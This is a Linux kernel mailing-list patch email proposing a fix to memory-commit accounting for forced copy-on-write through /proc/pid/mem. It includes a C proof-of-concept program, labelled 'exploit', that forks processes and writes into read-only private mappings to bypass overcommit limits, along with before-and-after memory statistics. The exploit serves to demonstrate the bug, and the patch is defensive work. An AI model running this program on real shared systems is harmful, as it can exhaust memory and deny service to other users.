Return-Path: <owner-linux-mm@kvack.org>
Received: from psmtp.com (na3sys010amx133.postini.com [74.125.245.133])
	by kanga.kvack.org (Postfix) with SMTP id 846F36B0092
	for <linux-mm@kvack.org>; Mon,  2 Apr 2012 11:36:37 -0400 (EDT)
Received: by bkwq16 with SMTP id q16so3093128bkw.14
        for <linux-mm@kvack.org>; Mon, 02 Apr 2012 08:36:35 -0700 (PDT)
Subject: [PATCH RFC] mm: account VMA before forced-COW via /proc/pid/mem
From: Konstantin Khlebnikov <khlebnikov@openvz.org>
Date: Mon, 02 Apr 2012 19:36:31 +0400
Message-ID: <20120402153631.5101.44091.stgit@zurg>
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit
Sender: owner-linux-mm@kvack.org
List-ID: <linux-mm.kvack.org>
To: linux-mm@kvack.org, linux-kernel@vger.kernel.org
Cc: Hugh Dickins <hughd@google.com>, Andrew Morton <akpm@linux-foundation.org>, Linus Torvalds <torvalds@linux-foundation.org>, Oleg Nesterov <oleg@redhat.com>

Currently kernel does not account read-only private mappings into memory commitment.
But these mappings can be force-COW-ed in get_user_pages(). This way we can freely
overcommit memory usage. And I'm afraid not only /proc/pid/mem able to trigger this.

This patch counts VMA into memory commitment before forced-COW in /proc/pid/mem.

Signed-off-by: Konstantin Khlebnikov <khlebnikov@openvz.org>

---

before patch:

$ ./private-overcommit 6
before:
AnonPages:        705912 kB
CommitLimit:     3964536 kB
Committed_AS:    1225340 kB
after:
AnonPages:       6991060 kB
CommitLimit:     3964536 kB
Committed_AS:    1226596 kB

after patch:

$ ./private-overcommit 6
before:
AnonPages:         98760 kB
CommitLimit:     3964512 kB
Committed_AS:     369864 kB
after:
AnonPages:       6378052 kB
CommitLimit:     3964512 kB
Committed_AS:    6662064 kB

Now overcommit control can work:

$ sudo sysctl vm.overcommit_memory=2
$ ./private-overcommit 6
before:
AnonPages:        105252 kB
CommitLimit:     3964512 kB
Committed_AS:     386884 kB
pwrite: Input/output error
pwrite: Input/output error
pwrite: Input/output error
after:
AnonPages:       3292332 kB
CommitLimit:     3964512 kB
Committed_AS:    3533468 kB

exploit:

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <fcntl.h>

int main (int argc, char **argv)
{
	size_t size = 1 << 30, off;
	int count;
	void *ptr;
	int pid = 0, fd;
	char path[64];

	count = (argc > 1) ? atoi(argv[1]) : 1;

	system("echo before:");
	system("grep AnonPages /proc/meminfo");
	system("grep Commit /proc/meminfo");

	if (setpgid(0, 0))
		return 2;

	ptr = mmap(NULL, size, PROT_READ, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	if (ptr == MAP_FAILED)
		return 2;

	while (count--) {
		pid = fork();
		if (pid < 0) {
			perror("fork");
			break;
		}
		if (pid == 0) {
			pause();
			return 0;
		}
		sprintf(path, "/proc/%d/mem", pid);
		fd = open(path, O_RDWR);
		if (fd < 0) {
			perror("open");
			break;
		}
		for (off = 0; off < size ; off += 4096)
			if (pwrite(fd, "*", 1, (unsigned long)ptr + off) != 1) {
				perror("pwrite");
				break;
			}
	}

	system("echo after:");
	system("grep AnonPages /proc/meminfo");
	system("grep Commit /proc/meminfo");

	kill(0, SIGINT);
	return 0;
}
---
 mm/memory.c |   54 ++++++++++++++++++++++++++++++++++++++++++++++++++++--
 1 files changed, 52 insertions(+), 2 deletions(-)

diff --git a/mm/memory.c b/mm/memory.c
index 9b8db37..c2c97d8 100644
--- a/mm/memory.c
+++ b/mm/memory.c
@@ -57,6 +57,7 @@
 #include <linux/swapops.h>
 #include <linux/elf.h>
 #include <linux/gfp.h>
+#include <linux/security.h>
 
 #include <asm/io.h>
 #include <asm/pgalloc.h>
@@ -3790,6 +3791,43 @@ int generic_access_phys(struct vm_area_struct *vma, unsigned long addr,
 #endif
 
 /*
+ * Verifies that vma is accounted, otherwise tries to charge it.
+ * Returns length of accounted area starting from given address.
+ */
+static unsigned long __account_vma(struct mm_struct *mm,
+		struct vm_area_struct **pvma, unsigned long addr)
+{
+	struct vm_area_struct *vma = *pvma;
+	unsigned long ret;
+
+	/*
+	 * Already accounted or not accountable?
+	 * See accountable_mapping() and mprotect_fixup().
+	 */
+	if ((vma->vm_flags & (VM_ACCOUNT | VM_NORESERVE | VM_SHARED |
+				VM_HUGETLB | VM_MAYWRITE)) != VM_MAYWRITE)
+		return vma->vm_end - addr;
+
+	up_read(&mm->mmap_sem);
+	down_write(&mm->mmap_sem);
+	*pvma = vma = find_vma(mm, addr);
+	if (vma && vma->vm_start <= addr) {
+		ret = vma->vm_end - addr;
+		if ((vma->vm_flags & (VM_ACCOUNT | VM_NORESERVE | VM_SHARED |
+				VM_HUGETLB | VM_MAYWRITE)) == VM_MAYWRITE) {
+			if (!security_vm_enough_memory_mm(mm, vma_pages(vma)))
+				vma->vm_flags |= VM_ACCOUNT;
+			else
+				ret = 0;
+		}
+	} else
+		ret = 0;
+	downgrade_write(&mm->mmap_sem);
+
+	return ret;
+}
+
+/*
  * Access another process' address space as given in mm.  If non-NULL, use the
  * given task for page fault accounting.
  */
@@ -3798,6 +3836,7 @@ static int __access_remote_vm(struct task_struct *tsk, struct mm_struct *mm,
 {
 	struct vm_area_struct *vma;
 	void *old_buf = buf;
+	unsigned long force = write ? 0 : ULONG_MAX;
 
 	down_read(&mm->mmap_sem);
 	/* ignore errors, just check how much was successfully transferred */
@@ -3806,15 +3845,24 @@ static int __access_remote_vm(struct task_struct *tsk, struct mm_struct *mm,
 		void *maddr;
 		struct page *page = NULL;
 
+again:
 		ret = get_user_pages(tsk, mm, addr, 1,
-				write, 1, &page, &vma);
+				write, force > 0, &page, &vma);
 		if (ret <= 0) {
+			vma = find_vma(mm, addr);
+			if (!vma || vma->vm_start > addr)
+				break;
+			/*
+			 * Use forced-COW only on accounted-vma, otherwise
+			 * we can COW too much and overcommit memory usage.
+			 */
+			if (!force && (force = __account_vma(mm, &vma, addr)))
+				goto again;
 			/*
 			 * Check if this is a VM_IO | VM_PFNMAP VMA, which
 			 * we can access using slightly different code.
 			 */
 #ifdef CONFIG_HAVE_IOREMAP_PROT
-			vma = find_vma(mm, addr);
 			if (!vma || vma->vm_start > addr)
 				break;
 			if (vma->vm_ops && vma->vm_ops->access)
@@ -3842,6 +3890,8 @@ static int __access_remote_vm(struct task_struct *tsk, struct mm_struct *mm,
 			kunmap(page);
 			page_cache_release(page);
 		}
+		if (force)
+			force -= bytes;
 		len -= bytes;
 		buf += bytes;
 		addr += bytes;

--
To unsubscribe, send a message with 'unsubscribe linux-mm' in
the body to majordomo@kvack.org.  For more info on Linux MM,
see: http://www.linux-mm.org/ .
Fight unfair telecom internet charges in Canada: sign http://stopthemeter.ca/
Don't email: <a href=mailto:"dont@kvack.org"> email@kvack.org </a>
